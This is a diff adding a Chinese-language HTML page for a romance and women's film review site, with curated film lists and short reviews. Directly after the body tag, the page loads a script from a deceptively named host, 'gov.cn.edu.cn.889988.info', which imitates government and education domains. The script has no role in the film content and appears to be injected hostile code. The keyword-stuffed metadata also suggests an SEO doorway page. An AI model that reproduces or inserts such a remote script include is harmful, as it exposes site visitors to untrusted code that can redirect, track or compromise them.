@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>蔷薇电影网 - 爱情电影/女性电影/华语情感片单与影评</title>
+<meta name="description" content="蔷薇电影网(qiangweidianyingwang-h5)专注爱情电影、女性电影、青春文艺与华语情感片单，提供情书式短评与选片指南，从《情书》到《蓝色大门》，移动端自适应，必应收录友好。">
+<meta name="keywords" content="蔷薇电影网, 爱情电影, 女性电影, 青春文艺, 华语情感片单, 情书影评, qiangweidianyingwang-h5">
+<meta name="author" content="蔷薇电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://qiangweidianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --rose:#D4727A;
+  --rose2:#A83E5A;
+  --gray:#5A4E52;
+  --paper:#F7F3EE;
+  --paper2:#F0EBE5;
+  --ink:#1F1B1C;
+  --moon:#EDE6E0;
+  --gold:#B08D57;
+  --line:rgba(212,114,122,.28);
+  --line2:rgba(168,62,90,.2);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"Noto Serif SC","Songti SC","SimSun","PingFang SC",serif;
+  background:
+    radial-gradient(60% 45% at 15% -5%, rgba(212,114,122,.1), transparent 60%),
+    radial-gradient(55% 40% at 85% 10%, rgba(176,141,87,.08), transparent 60%),
+    linear-gradient(180deg,var(--paper),#F3EEE7 50%,#ECE4DB 100%);
+  color:var(--ink);line-height:1.85;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 顶栏 */
+.rose-bar{
+  background:linear-gradient(90deg,var(--ink),var(--gray),var(--ink));
+  color:var(--paper);text-align:center;font-size:11px;letter-spacing:4px;
+  padding:7px 10px;font-weight:700;
+}
+
+/* 头部 */
+.header{max-width:1120px;margin:0 auto;padding:38px 20px 22px;text-align:center;position:relative}
+.header::before{content:"🌹";position:absolute;left:16px;top:24px;font-size:44px;opacity:.1}
+.header::after{content:"🌹";position:absolute;right:16px;top:24px;font-size:44px;opacity:.1}
+.emblem{
+  display:inline-flex;flex-direction:column;align-items:center;gap:6px;
+  padding:20px 40px;
+  background:var(--paper2);border:1px solid var(--line);border-radius:6px;
+  position:relative;
+}
+.emblem::before{content:"";position:absolute;top:-1px;left:-1px;width:18px;height:18px;border-top:2px solid var(--rose2);border-left:2px solid var(--rose2)}
+.emblem::after{content:"";position:absolute;bottom:-1px;right:-1px;width:18px;height:18px;border-bottom:2px solid var(--rose2);border-right:2px solid var(--rose2)}
+.emblem .badge{font-size:11px;color:var(--rose2);letter-spacing:4px;font-weight:700}
+.emblem h1{font-size:30px;letter-spacing:7px;color:var(--ink);font-weight:900}
+.emblem .sub{font-size:11px;color:var(--gray);letter-spacing:2px;font-style:italic}
+.header p.slogan{margin-top:16px;color:var(--gray);font-size:14px;max-width:640px;margin-left:auto;margin-right:auto;line-height:1.9}
+.header p.slogan .hl{color:var(--rose2);font-weight:700}
+
+/* 搜索 */
+.search-wrap{max-width:540px;margin:18px auto 0}
+.search-wrap form{display:flex;height:44px;border-radius:4px;overflow:hidden;border:2px solid var(--rose);background:var(--paper)}
+.search-wrap input{flex:1;border:none;outline:none;background:transparent;padding:0 18px;font-size:14px;color:var(--ink);font-family:"Noto Serif SC",serif}
+.search-wrap input::placeholder{color:#A99A9E}
+.search-wrap button{border:none;background:var(--rose2);color:var(--paper);padding:0 22px;font-weight:700;cursor:pointer;letter-spacing:2px;font-family:"Noto Serif SC",serif}
+
+/* 导航 */
+.nav{max-width:1120px;margin:22px auto 26px;padding:0 20px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:8px 18px;border:1px solid var(--line);border-radius:18px;font-size:13px;color:var(--gray);background:var(--paper2);transition:all .2s}
+.nav a:hover,.nav a.active{background:var(--rose2);color:var(--paper);border-color:var(--rose2);font-weight:700}
+
+/* 主区 */
+.main{max-width:1120px;margin:0 auto;padding:0 20px 30px}
+
+/* 卷首 */
+.rose-board{
+  position:relative;overflow:hidden;
+  background:linear-gradient(135deg,var(--ink),#332A2C);
+  color:var(--paper);border-left:5px solid var(--rose);
+  border-radius:6px;padding:32px 28px;margin-bottom:32px;
+}
+.rose-board::after{content:"🌹";position:absolute;right:24px;bottom:-14px;font-size:120px;opacity:.07}
+.rose-board .kicker{font-size:12px;color:var(--rose);letter-spacing:4px}
+.rose-board h2{font-size:26px;margin:8px 0 12px;color:var(--paper);letter-spacing:2px;font-weight:900}
+.rose-board p{color:rgba(247,243,238,.82);max-width:640px;font-size:14px;line-height:1.95}
+.rose-board .tags{margin-top:16px;display:flex;gap:10px;flex-wrap:wrap}
+.rose-board .tags span{padding:5px 14px;border:1px solid rgba(212,114,122,.4);border-radius:18px;font-size:12px;color:var(--rose)}
+
+/* 栏目头 */
+.section{margin-bottom:34px}
+.s-head{display:flex;align-items:center;gap:12px;margin-bottom:16px;border-bottom:1px solid var(--line);padding-bottom:10px}
+.s-head .glyph{font-size:18px}
+.s-head h3{font-size:19px;letter-spacing:2px;color:var(--ink);font-weight:900}
+.s-head .more{margin-left:auto;font-size:12px;color:var(--rose2);font-weight:700}
+
+/* 栏目一：蔷薇影单 */
+.thorn-row{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.thorn-card{
+  background:var(--paper2);border:1px solid var(--line);
+  border-top:4px solid var(--rose);
+  border-radius:6px;padding:20px;transition:all .3s;
+}
+.thorn-card:hover{transform:translateY(-4px);box-shadow:0 8px 24px rgba(212,114,122,.14)}
+.thorn-card .no{font-size:11px;color:var(--gray);letter-spacing:2px;margin-bottom:4px}
+.thorn-card h4{font-size:17px;margin-bottom:4px;color:var(--ink);letter-spacing:1px;font-weight:900}
+.thorn-card .meta{font-size:12px;color:var(--gray);margin-bottom:10px;font-style:italic}
+.thorn-card p{font-size:13px;color:#5A4E52;line-height:1.85}
+.thorn-card .chip{margin-top:12px;display:inline-block;font-size:11px;color:var(--rose2);border:1px solid var(--line);padding:3px 12px;border-radius:12px}
+
+/* 栏目二：带刺爱情 */
+.thorn-list{background:var(--paper2);border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.thorn-list-row{display:flex;gap:16px;padding:16px 18px;border-bottom:1px solid var(--line);align-items:flex-start}
+.thorn-list-row:last-child{border-bottom:none}
+.thorn-icon{width:44px;height:44px;border-radius:50%;background:var(--rose);color:var(--paper);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+.thorn-list-row:nth-child(2) .thorn-icon{background:var(--rose2)}
+.thorn-list-row:nth-child(3) .thorn-icon{background:var(--gold);color:var(--ink)}
+.thorn-list-row:nth-child(4) .thorn-icon{background:var(--gray)}
+.thorn-list-row:nth-child(5) .thorn-icon{background:#8C6A7A}
+.thorn-info{flex:1}
+.thorn-info h4{font-size:16px;color:var(--ink);letter-spacing:1px;font-weight:900}
+.thorn-info p{font-size:12px;color:var(--gray);margin-top:4px;line-height:1.75}
+.thorn-tag{font-size:11px;color:var(--rose2);border:1px solid var(--line2);padding:4px 12px;border-radius:12px;white-space:nowrap}
+
+/* 栏目三：女性电影馆 */
+.bloom-grid{display:flex;gap:16px;overflow-x:auto;padding-bottom:12px;scroll-snap-type:x mandatory}
+.bloom-card{scroll-snap-align:start;flex:0 0 240px;background:var(--paper2);border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.bloom-top{height:80px;display:flex;align-items:center;justify-content:center;font-size:36px;background:linear-gradient(135deg,var(--rose),var(--rose2))}
+.bloom-card:nth-child(2) .bloom-top{background:linear-gradient(135deg,var(--gold),#8A6A37)}
+.bloom-card:nth-child(3) .bloom-top{background:linear-gradient(135deg,#8C6A7A,#5A4A5A)}
+.bloom-card:nth-child(4) .bloom-top{background:linear-gradient(135deg,var(--gray),#3A3032)}
+.bloom-card:nth-child(5) .bloom-top{background:linear-gradient(135deg,#C98A92,#A83E5A)}
+.bloom-body{padding:14px}
+.bloom-body h4{font-size:15px;color:var(--ink);margin-bottom:4px;font-weight:900}
+.bloom-body .director{font-size:11px;color:var(--rose2);margin-bottom:6px;font-style:italic}
+.bloom-body p{font-size:12px;color:var(--gray);line-height:1.75}
+
+/* 栏目四：情书短评 */
+.letter-row{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.letter-card{
+  background:var(--paper2);border:1px solid var(--line);
+  border-left:4px solid var(--gold);
+  border-radius:6px;padding:18px;
+}
+.letter-card h4{font-size:16px;color:var(--ink);margin-bottom:4px;font-weight:900}
+.letter-card .meta{font-size:12px;color:var(--gray);margin-bottom:8px}
+.letter-card .quote{font-size:13px;color:#5A4E52;line-height:1.9;padding-left:12px;border-left:2px solid var(--rose);margin-bottom:8px}
+.letter-card .who{font-size:11px;color:var(--rose2);font-style:italic}
+
+/* 栏目五：关于 */
+.about{background:var(--ink);color:var(--paper);border-radius:8px;padding:28px;display:flex;gap:20px;align-items:flex-start;flex-wrap:wrap}
+.about .ico{font-size:40px}
+.about h3{font-size:18px;color:var(--rose);margin-bottom:10px;letter-spacing:1px}
+.about p{font-size:13px;color:rgba(247,243,238,.82);max-width:680px;line-height:1.95}
+.about .url{margin-top:10px;font-size:12px;color:var(--rose)}
+
+/* 页脚 */
+.footer{margin-top:36px;border-top:1px solid var(--line);padding:28px 20px 40px;text-align:center;color:var(--gray);font-size:12px}
+.footer a{color:var(--gray)}
+.footer .fn{margin-top:14px;display:flex;justify-content:center;gap:18px;flex-wrap:wrap}
+.footer .fn a{color:var(--gray)}
+.footer .fn a:hover{color:var(--rose2)}
+
+@media(max-width:900px){.thorn-row{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:640px){
+  .emblem h1{font-size:22px;letter-spacing:4px}
+  .emblem{padding:16px 26px}
+  .nav a{padding:6px 14px;font-size:12px}
+  .rose-board{padding:22px 18px}
+  .rose-board h2{font-size:21px}
+  .main{padding:0 14px 20px}
+  .thorn-row{grid-template-columns:1fr}
+  .letter-row{grid-template-columns:1fr}
+  .thorn-list-row{flex-wrap:wrap;gap:12px}
+  .thorn-tag{margin-left:0}
+  .bloom-card{flex-basis:82%}
+  .about{padding:18px 14px}
+  .header::before,.header::after{display:none}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="rose-bar">❦ 蔷薇电影网 · 爱情电影 / 女性电影 / 青春文艺 / 华语情感片单 ❦</div>
+
+<header class="header">
+  <div class="emblem">
+    <div class="badge">❦ ROSE · LOVE · CINEMA ❦</div>
+    <h1>蔷薇电影网</h1>
+    <div class="sub">qiangweidianyingwang-h5 · Romance & Women's Film</div>
+  </div>
+  <p class="slogan">每一朵蔷薇都带刺。<span class="hl">蔷薇电影网</span>专注爱情电影、女性电影与青春文艺片——暗恋、错过、黄昏恋、开放式结局。不播盗版、不挂播放器，只做选片与情书式影评。</p>
+  <div class="search-wrap">
+    <form action="#" method="get">
+      <input type="text" name="q" placeholder="搜 爱情电影 / 女性导演 / 青春文艺 / 暗恋 / 华语情感...">
+      <button type="submit">拾花</button>
+    </form>
+  </div>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">首页</a>
+  <a href="#">蔷薇影单</a>
+  <a href="#">带刺爱情</a>
+  <a href="#">女性电影馆</a>
+  <a href="#">情书短评</a>
+  <a href="#">关于蔷薇</a>
+</nav>
+
+<div class="main">
+
+  <section class="rose-board">
+    <div class="kicker">❦ 蔷薇初开 · 一帧心事 ❦</div>
+    <h2>爱情不是童话，是带刺的花</h2>
+    <p>蔷薇电影网专注爱情电影、女性电影、青春文艺与华语情感片单。从岩井俊二的《情书》到易智言的《蓝色大门》，从《花样年华》的克制到《盛夏未来》的直白——我们记录每一种爱的形态：暗恋、错过、黄昏恋、开放式结局。单页静态、移动端自适应、内页 # 占位，不提供盗版播放。</p>
+    <div class="tags">
+      <span>爱情电影</span><span>女性电影</span><span>青春文艺</span><span>华语情感</span><span>情书影评</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="list">
+    <div class="s-head"><span class="glyph">🌹</span><h3>蔷薇影单</h3><a class="more" href="#">全部 #</a></div>
+    <div class="thorn-row">
+      <article class="thorn-card">
+        <div class="no">N° 01</div>
+        <h4>《情书》</h4>
+        <div class="meta">1995 · 岩井俊二 · 日本</div>
+        <p>渡边博子给已故未婚夫写信，却收到了同名同姓的回信。两个藤井树在雪国的回忆里重叠。中山美穗分饰两角，那张借书卡上的素描是影史最温柔的告白。</p>
+        <span class="chip"># 暗恋经典</span>
+      </article>
+      <article class="thorn-card">
+        <div class="no">N° 02</div>
+        <h4>《蓝色大门》</h4>
+        <div class="meta">2002 · 易智言 · 台湾</div>
+        <p>桂纶镁演的孟克柔在"我喜欢你"和"我是女生"之间挣扎，陈柏霖的张士豪阳光得让人心疼。青春期的暧昧与困惑，被拍得透明而疼痛。</p>
+        <span class="chip"># 青春暧昧</span>
+      </article>
+      <article class="thorn-card">
+        <div class="no">N° 03</div>
+        <h4>《花样年华》</h4>
+        <div class="meta">2000 · 王家卫 · 香港</div>
+        <p>周慕云和苏丽珍在狭窄走廊里擦肩，旗袍换了23套，却始终没有跨过那条线。"如果有多一张船票，你会不会跟我走？"——华语爱情片的巅峰克制。</p>
+        <span class="chip"># 克制隐忍</span>
+      </article>
+      <article class="thorn-card">
+        <div class="no">N° 04</div>
+        <h4>《盛夏未来》</h4>
+        <div class="meta">2021 · 陈正道 · 大陆</div>
+        <p>张子枫和吴磊演两个"假情侣"的暑假。高考、暗恋、原生家庭、自我认同——Z世代的爱情观被拍得真实又轻盈，结尾那通电话让所有人破防。</p>
+        <span class="chip"># 青春治愈</span>
+      </article>
+      <article class="thorn-card">
+        <div class="no">N° 05</div>
+        <h4>《爱情神话》</h4>
+        <div class="meta">2021 · 邵艺辉 · 大陆</div>
+        <p>上海梧桐区里三个中年女人和一个老克勒的"爱情神话"。全片沪语对白，烟火气十足，女性群像写得活色生香。华语爱情片终于不再只有"霸道总裁爱上我"。</p>
+        <span class="chip"># 都市男女</span>
+      </article>
+      <article class="thorn-card">
+        <div class="no">N° 06</div>
+        <h4>《一页台北》</h4>
+        <div class="meta">2010 · 陈骏霖 · 台湾</div>
+        <p>便利店女孩和书店男孩的台北一夜。轻快、浪漫、有点迷幻，台北的夜被拍成了爱情童话。郭采洁的表演让人记住了那个总是微笑的女孩。</p>
+        <span class="chip"># 城市浪漫</span>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="thorn">
+    <div class="s-head"><span class="glyph">🌹</span><h3>带刺爱情</h3><a class="more" href="#">完整 #</a></div>
+    <div class="thorn-list">
+      <div class="thorn-list-row">
+        <div class="thorn-icon">🌱</div>
+        <div class="thorn-info"><h4>暗恋</h4><p>《情书》《那些年》《恋空》《雏菊》——暗恋是一场没有观众的独角戏。最纯粹的爱，往往说不出口。</p></div>
+        <div class="thorn-tag">8部</div>
+      </div>
+      <div class="thorn-list-row">
+        <div class="thorn-icon">💔</div>
+        <div class="thorn-info"><h4>错过</h4><p>《花样年华》《重庆森林》《比悲伤更悲伤的故事》——"我们最接近的时候，我们之间的距离只有0.01公分。"</p></div>
+        <div class="thorn-tag">10部</div>
+      </div>
+      <div class="thorn-list-row">
+        <div class="thorn-icon">🌇</div>
+        <div class="thorn-info"><h4>黄昏恋</h4><p>《爱》《东京塔》《再见我们的幼儿园》《幸福额度》——老了还能爱吗？当然能，而且更勇敢。</p></div>
+        <div class="thorn-tag">6部</div>
+      </div>
+      <div class="thorn-list-row">
+        <div class="thorn-icon">🔀</div>
+        <div class="thorn-info"><h4>开放式结局</h4><p>《爱在黎明破晓前》《迷失东京》《花束般的恋爱》——不给出答案的爱情，反而更真实。</p></div>
+        <div class="thorn-tag">7部</div>
+      </div>
+      <div class="thorn-list-row">
+        <div class="thorn-icon">🚫</div>
+        <div class="thorn-info"><h4>不伦之恋</h4><p>《失乐园》《色，戒》《朗读者》——禁忌之爱为何让人着迷？渡边淳一和王家卫给出了不同的答案。</p></div>
+        <div class="thorn-tag">5部</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="women">
+    <div class="s-head"><span class="glyph">🌹</span><h3>女性电影馆</h3><a class="more" href="#">更多 #</a></div>
+    <div class="bloom-grid">
+      <div class="bloom-card"><div class="bloom-top">🎬</div><div class="bloom-body"><h4>《钢琴课》</h4><div class="director">Jane Campion · 1993</div><p>哑女 Ada 用钢琴代替语言，用沉默表达欲望。霍利·亨特的手部特写是全片最动人的表演。戛纳金棕榈 + 奥斯卡最佳编剧。</p></div></div>
+      <div class="bloom-card"><div class="bloom-top">🌙</div><div class="bloom-body"><h4>《迷失东京》</h4><div class="director">Sofia Coppola · 2003</div><p>东京的霓虹灯下，两个孤独的灵魂短暂相遇。比尔·默瑞和斯嘉丽·约翰逊的暧昧，安静到让人心碎。</p></div></div>
+      <div class="bloom-card"><div class="bloom-top">🎭</div><div class="bloom-body"><h4>《伯德小姐》</h4><div class="director">Greta Gerwig · 2017</div><p>十七岁的 Christine 想逃离萨克拉门托。格蕾塔·葛韦格的导演处女作，关于成长、母女、离开。金球奖最佳音乐喜剧。</p></div></div>
+      <div class="bloom-card"><div class="bloom-top">🌾</div><div class="bloom-body"><h4>《无依之地》</h4><div class="director">Chloé Zhao · 2020</div><p>经济崩溃后，Fern 开着房车穿越美国西部。赵婷用非职业演员拍出了现代游牧民族的尊严。威尼斯金狮 + 奥斯卡最佳导演。</p></div></div>
+      <div class="bloom-card"><div class="bloom-top">🪷</div><div class="bloom-body"><h4>《燃烧女子的肖像》</h4><div class="director">Céline Sciamma · 2019</div><p>18世纪布列塔尼，女画家为贵族小姐画肖像，两人之间产生了禁忌的爱。每一帧都像古典油画，凝视本身就是爱情。</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="letter">
+    <div class="s-head"><span class="glyph">🌹</span><h3>情书短评</h3><a class="more" href="#">完整 #</a></div>
+    <div class="letter-row">
+      <article class="letter-card">
+        <h4>《花束般的恋爱》</h4>
+        <div class="meta">2021 · 土井裕泰 · 日本</div>
+        <div class="quote">"我们以为相遇是命中注定，其实只是兴趣相投。分手后才明白：爱情会消失，但那段时间是真的。"</div>
+        <div class="who">—— 适合：刚分手的你 / 泪点预警</div>
+      </article>
+      <article class="letter-card">
+        <h4>《爱在黎明破晓前》</h4>
+        <div class="meta">1995 · Richard Linklater · 美国</div>
+        <div class="quote">"维也纳的一夜，两个陌生人聊了整个晚上。九年后《爱在日落黄昏时》重逢，十八年后《爱在午夜降临前》吵架。爱情三部曲就是一个人从25到43岁。"</div>
+        <div class="who">—— 适合：相信一见钟情 / 无雷点</div>
+      </article>
+      <article class="letter-card">
+        <h4>《我的少女时代》</h4>
+        <div class="meta">2015 · 陈玉珊 · 台湾</div>
+        <div class="quote">"致敬《那些年》的青春片，但比《那些年》更会撒糖。宋芸桦和王大陆的化学反应，是台式青春最甜的样子。"</div>
+        <div class="who">—— 适合：想回到高中 / 甜度满分</div>
+      </article>
+      <article class="letter-card">
+        <h4>《比悲伤更悲伤的故事》</h4>
+        <div class="meta">2018 · 林孝谦 · 台湾</div>
+        <div class="quote">"如果你准备好了纸巾，这部片不会让你失望。刘以豪和陈意涵演绎的是'爱到放手'的极致。哭点密集，慎入。"</div>
+        <div class="who">—— 适合：想大哭一场 / 泪点爆表</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目五 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="glyph">❦</span><h3>关于蔷薇电影网</h3></div>
+    <div class="about">
+      <div class="ico">🌹</div>
+      <div>
+        <h3>蔷薇初开，一帧心事</h3>
+        <p>蔷薇电影网（qiangweidianyingwang-h5）专注爱情电影、女性电影、青春文艺与华语情感片单的选片与影评。本站不提供任何未授权片源下载或在线播放服务，不挂第三方播放器、不提供解析线路。我们做的事：帮你找到那个"对的心情"该看的那部电影。</p>
+        <div class="url">https://qiangweidianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div>© 2026 蔷薇电影网 | qiangweidianyingwang-h5</div>
+  <div>永久地址：<a href="https://qiangweidianyingwang-h5.github.io">https://qiangweidianyingwang-h5.github.io</a></div>
+  <div>本站为爱情/女性/青春文艺电影选片与影评站，不提供盗版播放服务。</div>
+  <div class="fn">
+    <a href="#">首页</a><a href="#">蔷薇影单</a><a href="#">带刺爱情</a><a href="#">女性电影馆</a><a href="#">情书短评</a><a href="#">关于</a>
+  </div>
+</footer>
+
+</body>
+</html>
